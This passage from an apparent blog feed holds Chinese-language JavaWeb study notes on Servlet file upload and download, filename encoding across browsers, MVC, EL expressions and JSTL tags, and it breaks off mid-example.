class="line">&#x2F;&#x2F;doPost方法：</span><br><span class="line">ServletInputStream inputStream &#x3D; req.getInputStream();</span><br><span class="line">byte[] buffer &#x3D; new byte[1024000];</span><br><span class="line">int read &#x3D; inputStream.read(buffer);</span><br><span class="line">System.out.println(new String(buffer, 0, read));</span><br></pre></td></tr></table></figure><p>首先获取输入流数据，然后定义一个字节数组，大小是1024000，大点能装得下数据就行。然后使用输入流的read方法，将输入流保存到buffer里面，并且返回输入流的长度给read。最后输出，需要实例化String对象，传buffer进去，将0到read长度（即所有流数据）变成字符串输出。</p><p>当然，还需要给Servlet程序配置web.xml，并且前端代码的action修改成Servlet的路径<code>http://localhost:8080/EL_JSTL/upload</code>, 这是绝对路径，如果是相对路径，因为在web目录，可使用：upload。注意不要用/upload, 不然会默认是根目录下的。然后重新部署。</p><p><img src="/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210515214105875.png" alt="image-20210515214105875"></p><p>获取到了上传的数据。</p><h2 id="解析数据"><a href="#解析数据" class="headerlink" title="解析数据"></a>解析数据</h2><p>需要使用commons-fileupload.jar包，到apache下。然后导入。</p><p>还需要commons-io.jar, 因为输入输出流需要IO操作。</p><p>用到的类是：ServletFileUpload类，它涉及以下方法：</p><ul><li>ServletFileUpload.isMultipartContent(HttpServletRequest request), 判断上传的数据是不是多段数据，返回true或false。</li><li>ServletFileUpload.parseRequest(HttpServletReqeust request), 解析上传的数据，提取出每一个表单项，装到List集合。</li><li>isFormField(), 判断当前表单项是否是普通表单项，是则表示普通表单项，否则是上传文件项。</li><li>getFieldName(), 获得表单项中的name属性值。</li><li>getString(), 获得当前表单项的值。</li><li>getName(), 获得上传的文件名。</li><li>write(file), 将上传的文件写到file所指的磁盘路径文件。</li></ul><p>doPost函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if(ServletFileUpload.isMultipartContent(req))&#123;</span><br><span class="line">           &#x2F;&#x2F;创建FileItemFactory工厂实现类</span><br><span class="line">           DiskFileItemFactory diskFileItemFactory &#x3D; new DiskFileItemFactory();</span><br><span class="line">           &#x2F;&#x2F;创建用于解析上传数据的工具栏ServletFileUpload</span><br><span class="line">           ServletFileUpload servletFileUpload &#x3D; new ServletFileUpload(diskFileItemFactory);</span><br><span class="line">           try &#123;</span><br><span class="line">               List&lt;FileItem&gt; list &#x3D; servletFileUpload.parseRequest(req);</span><br><span class="line">               for(FileItem item : list)&#123;</span><br><span class="line">                   if(item.isFormField())&#123;</span><br><span class="line">                       &#x2F;&#x2F;普通表单项</span><br><span class="line">                       System.out.println(&quot;表单项的name属性值：&quot;+item.getFieldName());</span><br><span class="line">                       System.out.println(&quot;表单项的值：&quot;+item.getString(&quot;UTF-8&quot;));</span><br><span class="line">                   &#125;else&#123;</span><br><span class="line">                       System.out.println(&quot;上传的文件名：&quot;+item.getName());</span><br><span class="line">                       System.out.println(&quot;表单项的name属性值：&quot;+item.getFieldName());</span><br><span class="line">                       item.write(new File(&quot;D:\\&quot;+item.getName()));</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; catch (FileUploadException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125; catch (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>D盘下就可以看到上传的文件了。</p><h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>创建DownloadServlet类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获取要下载的文件名</span><br><span class="line">        String fileName &#x3D; &quot;burp.png&quot;;</span><br><span class="line">        &#x2F;&#x2F;获取要下载的文件名的类型</span><br><span class="line">        ServletContext servletContext &#x3D; getServletContext();</span><br><span class="line">        String mimeType &#x3D; servletContext.getMimeType(&quot;file&#x2F;&quot;+fileName);</span><br><span class="line">        System.out.println(&quot;要下载的文件类型：&quot;+mimeType);</span><br><span class="line">        &#x2F;&#x2F;设置返回的数据类型</span><br><span class="line">        resp.setContentType(mimeType);</span><br><span class="line">        &#x2F;&#x2F;设置返回头，告诉客户端是下载文件,attachment表示附件</span><br><span class="line">        resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+fileName);</span><br><span class="line">        &#x2F;&#x2F;获取文件流</span><br><span class="line">        InputStream resourceAsStream &#x3D; servletContext.getResourceAsStream(&quot;file&#x2F;&quot; + fileName);</span><br><span class="line">        &#x2F;&#x2F;获取响应的输出流</span><br><span class="line">        OutputStream outputStream &#x3D; resp.getOutputStream();</span><br><span class="line">        &#x2F;&#x2F;将文件流复制到输出流输出</span><br><span class="line">        IOUtils.copy(resourceAsStream, outputStream);</span><br></pre></td></tr></table></figure><p>这里是在web目录下新建了一个file目录，里面是burp.png图片。之后部署web.xml，访问路径是/download, 然后重新部署。访问即可下载。</p><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>setHeader里面，文件名可以是自定义的。但如果是中文名，需要使用URL编码，针对谷歌浏览器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+ URLEncoder.encode(&quot;中国.png&quot;, &quot;UTF-8&quot;));</span><br></pre></td></tr></table></figure><p>使用URLEncoder.encode即可。</p><h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>如果是火狐浏览器，对于中文名称的文件使用的是Base64编码。下面先测试使用base64：</p><p>加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String content &#x3D; &quot;这是base64要编码的中文内容&quot;;</span><br><span class="line">&#x2F;&#x2F;new一个base64编码对象</span><br><span class="line">Base64.Encoder encoder &#x3D; Base64.getEncoder();</span><br><span class="line">&#x2F;&#x2F;将content内容使用getBytes转换成字节流，然后再encode，返回也是字节数组</span><br><span class="line">byte[] encodecontent &#x3D; encoder.encode(content.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">&#x2F;&#x2F;需要将字节流转换成字符串输出</span><br><span class="line">System.out.println(new String(encodecontent));</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获取解密对象</span><br><span class="line">Base64.Decoder decoder &#x3D; Base64.getDecoder();</span><br><span class="line">&#x2F;&#x2F;将加密后的字节流解密，返回也是字节数组</span><br><span class="line">byte[] decode &#x3D; decoder.decode(encodecontent);</span><br><span class="line">&#x2F;&#x2F;将字节数组转换成字符串输出</span><br><span class="line">System.out.println(new String(decode, &quot;UTF-8&quot;));</span><br></pre></td></tr></table></figure><p>但是到Servlet程序中进行文件下载时，setHeader的文件名进行base64编码需要有一个特定的格式：</p><p><code>?charset?B?xxx?=</code></p><p>charset表示编码类型，B表示是Base64编码，xxx是Base64加密后的内容，=是结束。因此有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp.setHeader(&quot;Content-Disposition&quot;,</span><br><span class="line">                &quot;attachment; filename&#x3D;?UTF-8?B?&quot;+Base64.getEncoder().encode(&quot;中国.png&quot;.getBytes(&quot;UTF-8&quot;))+&quot;?&#x3D;&quot;);</span><br></pre></td></tr></table></figure><h2 id="User-Agent判断"><a href="#User-Agent判断" class="headerlink" title="User-Agent判断"></a>User-Agent判断</h2><p>但是用了火狐设置的方法，IE又不支持了。。因此需要根据User-Agent来判断浏览器，从而判断应该使用哪种方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(req.getHeader(&quot;User-Agent&quot;).contains(&quot;FireFox&quot;))&#123;</span><br><span class="line">            resp.setHeader(&quot;Content-Disposition&quot;,</span><br><span class="line">                    &quot;attachment; filename&#x3D;?UTF-8?B?&quot;+Base64.getEncoder().encode(&quot;中国.png&quot;.getBytes(&quot;UTF-8&quot;))+&quot;?&#x3D;&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+ URLEncoder.encode(&quot;中国.png&quot;, &quot;UTF-8&quot;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="MVC概念"><a href="#MVC概念" class="headerlink" title="MVC概念"></a>MVC概念</h1><p>主要是将Web层分开工作，更好的解耦合。</p><p><img src="/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210515233352946.png" alt="image-20210515233352946"></p><p>M是module, 表示模型，V是View，表示视图，C是Controller，表示控制器。</p><ul><li>Module：将与业务相关的数据封装成JavaBean类，但是不处理数据。有：JavaBean/domain/entity/pojo。</li><li>View：只负责展示界面和输出数据。有：JSP/HTML</li><li>Controller：只负责接收请求，然后调用业务层的代码处理请求，获取数据，然后派发界面，跳转到某个界面。有：Servlet。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习文件上传和下载。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(6)</title>
    <link href="https://ggyggy666.github.io/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/"/>
    <id>https://ggyggy666.github.io/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/</id>
    <published>2021-05-14T02:23:36.000Z</published>
    <updated>2021-05-15T13:10:30.750Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习EL表达式和JSTL标签库。</p><a id="more"></a><h1 id="EL表达式使用"><a href="#EL表达式使用" class="headerlink" title="EL表达式使用"></a>EL表达式使用</h1><p><strong>EL表达式：${key}</strong></p><p>创建一个新的工程，在index.jsp页面写</p><p><img src="https://i.loli.net/2021/05/14/lu9D4WqtZorbf52.png" alt="image-20210514102530819"></p><p>首先先在request中保存数据，然后按两种表达式方法输出。</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210514102435242.png" alt="image-20210514102435242"></p><p>都成功输出来了。但是如果key不存在，比如改成获取key1的值</p><p><img src="https://i.loli.net/2021/05/14/edVgEQyWCK1M6Nq.png" alt="image-20210514102700828"></p><p>表达式脚本会输出null, EL表达式直接为空。因此EL表达式输出更加精确。</p><h1 id="四个域对象输出顺序"><a href="#四个域对象输出顺序" class="headerlink" title="四个域对象输出顺序"></a>四个域对象输出顺序</h1><p><strong>如果它们域中保存的key名称都相同，按照域对象从小到大的顺序输出</strong></p><p><img src="https://i.loli.net/2021/05/14/fzMl9DFN6xWkw4H.png" alt="image-20210514103245806"></p><p>key值都是key,那么输出是：1</p><p>将pageContext那行注释掉，输出是：2</p><p>将request那行注释掉，输出是：3</p><p>将session那行注释掉后，还得重启浏览器清除掉session, 输出是：4</p><p>将application那行注释掉后，重启tomcat服务，没有输出了。</p><h1 id="输出Bean对象的属性"><a href="#输出Bean对象的属性" class="headerlink" title="输出Bean对象的属性"></a>输出Bean对象的属性</h1><p>有普通属性、数组、List和Map属性</p><p>首先定义一个Person类</p><p><img src="https://i.loli.net/2021/05/14/Csq7pHEbWZU6I2D.png" alt="image-20210514105107548"></p><p>定义了普通String类型，字符数组类型，List类型和Map类型。生成了有参和无参的构造函数，生成了Getter和Setter方法，最后生成了toString方法。</p><p>在b.jsp中，创建一个Person对象，然后调用Setxxx的方法将Person里的属性初始化。</p><p><img src="https://i.loli.net/2021/05/14/EnM6eDhIwdmNP2i.png" alt="image-20210514105334131"></p><p>初始化数组并作为参数：<code>new String[]{&quot;&quot;,&quot;&quot;}</code></p><p>定义List,里面值是String类型：</p><p><code>List&lt;String&gt; cities = new ArrayList&lt;String&gt;();</code></p><p>定义Map，key是String类型，value是Object类型：</p><p><code>Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();</code></p><p>最后，将这个实例化后的对象保存在pageContext对象中。</p><ol><li>获取person对象：<code>${p}</code></li></ol><p><img src="https://i.loli.net/2021/05/14/M69riECOyVXTJYv.png" alt="image-20210514105824600"></p><p>全都输出来了。</p><ol start="2"><li><p>获取name: <code>${p.name}</code></p></li><li><p>获取数组：<code>${p.phone}</code></p><p>输出了：[Ljava.lang.String;@2af43773，显然不行。因为数组的值需要用下标访问。</p><p><code>${p.phone[0]}</code></p></li><li><p>获取List属性值：<code>${p.cities}</code></p><p>与数组不同，这样可以直接输出List里面所有值。如果想获取某个值：<code>${p.cities[0]}</code></p></li><li><p>获取map属性值：<code>${p.map}</code></p><p>同样可以直接将map里面的所有键值对输出。要获取某个键的值：<code>${p.map.key1}</code></p></li></ol><p>这里要注意一点，输出对象里面的属性值，这个值是根据那个对象的Get函数方法返回的，而不是直接访问那个属性。</p><p>比如在Person类里面定义多一个属性：<code>private int age = 18;</code></p><p>然后JSP里面使用：<code>${p.age}</code>是不行的。这个时候需要给age属性生成一个Get方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int getAge() &#123;</span><br><span class="line">    return age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候才会输出18来。而且就算没有定义age, 直接使用Get方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int getAge() &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新部署后，也能输出18。它是根据Getxxx方法，获取Get后面的字符，将其转换为小写作为属性输出。</p><h1 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h1><p>EL表达式里面也可以进行各种运算。</p><p><strong>关系运算：</strong></p><p><img src="https://i.loli.net/2021/05/14/6IRd2JxGsrHEo5P.png" alt="image-20210514111443950"></p><p><strong>逻辑运算：</strong></p><p><img src="https://i.loli.net/2021/05/14/go8hNnwU1zYC23I.png" alt="image-20210514111503633"></p><p><strong>算术运算</strong></p><p><img src="https://i.loli.net/2021/05/14/Swzj4XM7lKVhARQ.png" alt="image-20210514111728149"></p><p>注意，除法得到的是浮点数，12.0</p><p><strong>empty运算</strong></p><p>${empty xxx}, 判断xxx是否为空</p><p><img src="https://i.loli.net/2021/05/14/cSxY3UHRVvBikGj.png" alt="image-20210514112203440"></p><p>比如：${empty emptyNull}, 返回true</p><p><strong>三元运算</strong></p><p><code>(12==12)?&quot;yes&quot;:&quot;no&quot;</code></p><p><strong>点运算和[]运算</strong></p><p>其实就是获取键值对的值。比如一个map对象，map.key就行。如果key本身包含运算符，就不能用.了。比如key是：a.a.a,或者b+b+b，不能用map.a.a.a这些，需要用[]。如：map[‘a.a.a’], map[‘b+b+b’], 需要用引号。</p><h1 id="EL表达式的11个隐含对象"><a href="#EL表达式的11个隐含对象" class="headerlink" title="EL表达式的11个隐含对象"></a>EL表达式的11个隐含对象</h1><p>它们都是EL表达式自己定义的，可以直接使用。</p><p><img src="https://i.loli.net/2021/05/14/7xXyzUgN8poMZ9Q.png" alt="image-20210514123710581"></p><p><img src="https://i.loli.net/2021/05/14/cmXhxHDdls4gfES.png" alt="image-20210514123725522"></p><h2 id="获取四个域的属性值"><a href="#获取四个域的属性值" class="headerlink" title="获取四个域的属性值"></a>获取四个域的属性值</h2><p>上面也提到过，四个域，当它们的键key一样时，输出会按照域的大小顺序来输出，而且只输出最小的那个。这样想获取其它域的key的值的时候就没有办法获取。于是，可以使用EL表达式的四个域获取。</p><p><img src="https://i.loli.net/2021/05/14/J9KPtoEYy8NVp7s.png" alt="image-20210514124137930"></p><p>这样四个数字都能输出来。</p><h2 id="pageContext的使用"><a href="#pageContext的使用" class="headerlink" title="pageContext的使用"></a>pageContext的使用</h2><p>这个pageContext可以获取其它九大对象，因此也可以使用相应的方法。比如request对象和session对象。</p><p><img src="https://i.loli.net/2021/05/14/BshWKjue1cqOHvM.png" alt="image-20210514125042396"></p><p>输出：</p><p><img src="https://i.loli.net/2021/05/14/kICxJs8tBOWjLpU.png" alt="image-20210514125101937"></p><p>但是这样比原来的表达式脚本还麻烦，因此需要一个技巧：</p><p><img src="https://i.loli.net/2021/05/14/G5SLyldnZv8wMWk.png" alt="image-20210514125249587"></p><p>先把request域存储起来，之后使用req就可以了。其它对象类似。</p><h2 id="其它对象"><a href="#其它对象" class="headerlink" title="其它对象"></a>其它对象</h2><h3 id="param"><a href="#param" class="headerlink" title="param"></a>param</h3><p>可以获取请求参数的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;param.username&#125;&lt;br&gt;</span><br><span class="line">$&#123;paramValues.hobby[0]&#125;&lt;br&gt;</span><br><span class="line">$&#123;paramValues.hobby[1]&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>访问：<a href="http://localhost:8080/EL_JSTL/d.jsp?username=ggy&amp;hobby=run&amp;hobby=sing" target="_blank" rel="noopener">http://localhost:8080/EL_JSTL/d.jsp?username=ggy&amp;hobby=run&amp;hobby=sing</a></p><p>页面输出：ggy run sing</p><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p><img src="https://i.loli.net/2021/05/14/6wzOnBxMq5FjKls.png" alt="image-20210514125958783"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>因为cookie是键值对<code>xxx=xxx</code>, 所以它有name和value之分</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210514130205910.png" alt="image-20210514130205910"></p><h3 id="initParam"><a href="#initParam" class="headerlink" title="initParam"></a>initParam</h3><p>可以输出web.xml中配置的context-param值</p><p>web.xml中配置：</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210514130449476.png" alt="image-20210514130449476"></p><p>代码：</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210514130356972.png" alt="image-20210514130356972"></p><p>可以通过${initParam.参数名}获取参数值。</p><h1 id="JSTL标签库"><a href="#JSTL标签库" class="headerlink" title="JSTL标签库"></a>JSTL标签库</h1><p>JSP Standard Tag Library.</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210515121912297.png" alt="image-20210515121912297"></p><p>需要在JSP页面中使用taglib指令将标签库引进：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot;%&gt;</span><br></pre></td></tr></table></figure><p>prefix是别名，之后就可以使用：<code>&lt;c:xx&gt;</code>作为标签使用。</p><p>当然，其它库的别名是：x, fmt, sql, fn</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先得下载两个jar包。taglibs-standard-spec-1.2.5， taglibs-standard-impl-1.2.5， 然后导入到工程模块中。</p><p>之后可以手动输入taglib, 或者可以输入：<code>&lt;c:forEach</code>, 就会出现提示，按tab就行。</p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a>set标签</h3><p>可以在域中存储数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set scope&#x3D;&quot;page&quot; var&#x3D;&quot;a&quot; value&#x3D;&quot;ggy&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>scope代表域，var就是key，value就是值。</p><ul><li>page: pageContext域</li><li>request: request域</li><li>session：session域</li><li>application：ServletContext域</li></ul><p>之后使用EL表达式读取域的数据即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set scope&#x3D;&quot;request&quot; var&#x3D;&quot;a&quot; value&#x3D;&quot;ggy&quot;&gt;&lt;&#x2F;c:set&gt;</span><br><span class="line">$&#123;requestScope.a&#125;</span><br></pre></td></tr></table></figure><h3 id="if标签"><a href="#if标签" class="headerlink" title="if标签"></a>if标签</h3><p>用来做判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:if test&#x3D;&quot;$&#123;12&#x3D;&#x3D;12&#125;&quot;&gt;</span><br><span class="line">    &lt;h1&gt;ggy666&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;c:if&gt;</span><br></pre></td></tr></table></figure><p>test的值应该是True或者False，而要得到这两个值，需要使用EL表达式进行条件判断。如果True，则执行标签里面的内容<code>&lt;h1&gt;</code>, 否则不会执行。</p><h3 id="choose标签"><a href="#choose标签" class="headerlink" title="choose标签"></a>choose标签</h3><p>choose, when, otherwise一起用的。相当于switch case default，进行多项选择。但是case某一个是真，后面如果没有break的话，之后都会执行。而when只执行那一个when标签里的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    request.setAttribute(&quot;ggy&quot;, &quot;ggy666&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test&#x3D;&quot;$&#123;requestScope.ggy&#x3D;&#x3D;&#39;ggy666&#39;&#125;&quot;&gt;</span><br><span class="line">        &lt;h3&gt;Yes&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;c:when&gt;</span><br><span class="line">    &lt;c:otherwise&gt;</span><br><span class="line">        &lt;h3&gt;Error!&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;c:otherwise&gt;</span><br><span class="line">&lt;&#x2F;c:choose&gt;</span><br></pre></td></tr></table></figure><p>有一个注意点，choose标签里面不能使用HTML注释，只能用JSP注释。when的父标签必须是choose标签。就是说，如果otherwise标签里面也有选择判断，需要使用when, 那么就必须先使用choose, 再加when</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:otherwise&gt;</span><br><span class="line">    &lt;c:choose&gt;</span><br><span class="line">        &lt;c:when test&#x3D;&quot;$&#123;requestScope.ggy!&#x3D;&#39;ggy666&#39;&#125;&quot;&gt;</span><br><span class="line">            &lt;h3&gt;No&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;c:when&gt;</span><br><span class="line">    &lt;&#x2F;c:choose&gt;</span><br><span class="line">&lt;&#x2F;c:otherwise&gt;</span><br></pre></td></tr></table></figure><h3 id="forEach标签"><a href="#forEach标签" class="headerlink" title="forEach标签"></a>forEach标签</h3><h4 id="循环遍历数字范围"><a href="#循环遍历数字范围" class="headerlink" title="循环遍历数字范围"></a>循环遍历数字范围</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:forEach begin&#x3D;&quot;1&quot; end&#x3D;&quot;10&quot; var&#x3D;&quot;i&quot;&gt;</span><br><span class="line">    $&#123;i&#125;</span><br><span class="line">&lt;&#x2F;c:forEach&gt;</span><br></pre></td></tr></table></figure><p>输出1到10. begin是开始循环，end是结束循环，var是循环的变量。</p><h4 id="循环遍历数组"><a href="#循环遍历数组" class="headerlink" title="循环遍历数组"></a>循环遍历数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    request.setAttribute(&quot;arr&quot;, new String[]&#123;&quot;gg&quot;, &quot;ggy&quot;, &quot;ggy666&quot;&#125;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.arr&#125;&quot; var&#x3D;&quot;n&quot;&gt;</span><br><span class="line">    $&#123;n&#125;</span><br><span class="line">&lt;&#x2F;c:forEach&gt;</span><br></pre></td></tr></table></figure><p>首先保存一个数组到request域中，之后使用${requestScope.arr}定位到arr数组，并且赋值到items，表示要遍历的数组，var则是遍历的变量。</p><h4 id="循环遍历Map"><a href="#循环遍历Map" class="headerlink" title="循环遍历Map"></a>循环遍历Map</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Map&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;key1&quot;, &quot;ggy666&quot;);</span><br><span class="line">    map.put(&quot;key2&quot;, &quot;root&quot;);</span><br><span class="line">    request.setAttribute(&quot;map&quot;, map);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.map&#125;&quot; var&#x3D;&quot;m&quot;&gt;</span><br><span class="line">    $&#123;m&#125;</span><br><span class="line">&lt;&#x2F;c:forEach&gt;</span><br></pre></td></tr></table></figure><p>同样先定义初始化map, 然后保存到request域中。之后遍历。不过因为是map，所以${m}输出的是键值对。如果只想输出key获取value，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;m.key&#125;</span><br><span class="line">$&#123;m.value&#125;</span><br></pre></td></tr></table></figure><h4 id="循环遍历List集合中对象的属性"><a href="#循环遍历List集合中对象的属性" class="headerlink" title="循环遍历List集合中对象的属性"></a>循环遍历List集合中对象的属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    List&lt;Person&gt; personList &#x3D; new ArrayList&lt;Person&gt;();</span><br><span class="line">    for(int i&#x3D;0; i&lt;5; i++)&#123;</span><br><span class="line">        personList.add(new Person(&quot;name&quot;+i, &quot;134&quot;+i));</span><br><span class="line">    &#125;</span><br><span class="line">    request.setAttribute(&quot;per&quot;, personList);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.per&#125;&quot; var&#x3D;&quot;i&quot;&gt;</span><br><span class="line">    $&#123;i.name&#125;</span><br><span class="line">    $&#123;i.phone&#125;</span><br><span 